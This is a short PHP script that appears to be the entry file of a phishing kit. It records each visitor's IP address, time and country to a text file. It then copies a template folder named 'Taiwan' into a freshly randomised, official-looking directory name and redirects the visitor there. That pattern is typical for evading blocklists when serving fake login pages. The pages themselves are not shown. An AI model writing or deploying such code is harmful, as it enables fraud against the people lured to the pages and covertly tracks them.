<?php
session_start();
date_default_timezone_set('Europe/Madrid');
include('dort7wa.php');



/// TIME
date_default_timezone_set('GMT');
$TIME = date("d-m-Y H:i:s"); 

/// COUNTRY
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ; // Country

/// VISITOR
$ip = getenv("REMOTE_ADDR");
$file = fopen("xView.txt","a");
fwrite($file,$ip."  -   ".$TIME." -  " . $COUNTRY ."\n")  ;

/// Geny & copy

$khaylota=md5(rand(0,100000000000));
$tkharbi9=md5("$khaylota");
$chakhbatchakhabite=base64_encode($tkharbi9);
$finawaghadi= '20232723-50QTR41861547UID_25012021-QTR-id_url.html=db'.md5("$chakhbatchakhabite").'';
function recurse_copy($tri9lycee,$finawaghadi) {
$dir3a9lek = opendir($tri9lycee);
@mkdir($finawaghadi);
while(false !== ( $milafak7al = readdir($dir3a9lek)) ) {
if (( $milafak7al != '.' ) && ( $milafak7al != '..' )) {
if ( is_dir($tri9lycee . '/' . $milafak7al) ) {
recurse_copy($tri9lycee . '/' . $milafak7al,$finawaghadi . '/' . $milafak7al);
}
else {
copy($tri9lycee . '/' . $milafak7al,$finawaghadi . '/' . $milafak7al);
}
}
}
closedir($dir3a9lek);
}

$tri9lycee="Taiwan";
recurse_copy( $tri9lycee, $finawaghadi );
header("location:$finawaghadi");
?> 